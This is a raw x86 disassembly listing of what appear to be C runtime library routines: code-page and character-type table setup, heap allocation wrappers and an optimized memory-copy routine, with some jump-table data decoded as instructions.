  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
